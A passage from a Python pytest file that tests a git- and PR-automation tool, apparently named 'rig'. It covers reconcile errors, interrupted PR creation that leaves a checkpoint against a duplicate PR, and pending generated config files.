        raise tf.TrackedFilesError("git timed out")

    monkeypatch.setattr(tf, "pending_reconcile", boom)
    prefix = SimpleNamespace(kind="provision_ship_task_prefix", target=forge.repo, category="task", item="code_prefix")

    ctx = tf.apply_context(SimpleNamespace(diverted=[prefix]), {"tracked_files": {}}, forge.repo, landing_config=None)

    assert ctx.diverted_pending == []
    assert any("could not check the held-back files" in n for n in ctx.discovery.notes), ctx.discovery.notes


def test_an_interrupt_between_the_push_and_the_pr_leaves_a_checkpoint_that_blocks_a_second_pr(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)

    def interrupted(cmd, cwd=None, **kw):
        if "create" in cmd:
            raise KeyboardInterrupt  # Ctrl-C while `gh pr create` runs
        return _Forge()(cmd, cwd=cwd, **kw)

    with pytest.raises(KeyboardInterrupt):
        tf.land(forge.repo, _settings(), runner=interrupted, spawn_ship=False)
    again = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert again.status == "in-flight" and "opened no PR" in again.message
    assert len(_g(forge.origin, "branch", "--list", "rig/*").splitlines()) == 1  # no second branch, no second PR


def test_a_generated_file_present_in_the_checkout_but_not_on_main_is_still_pending(forge, monkeypatch, capsys,
                                                                                 fake_agent_tools):
    from riglib.cli import main

    _cli_env(forge, monkeypatch, fake_agent_tools)
    _land_on_main(forge, TASK_BLOCK)  # main routes tickets with code_prefix UB but lacks .ship-config
    a = _worktree(forge.repo, "a")
    (a / ".ship-config").write_text("SHIP_TASK_CODE_PREFIX=UB\n", encoding="utf-8")  # an earlier rig wrote it here

    main(["apply", "-C", str(a)])
    out = capsys.readouterr().out

    assert "land rig's own reconcile of .ship-config" in out
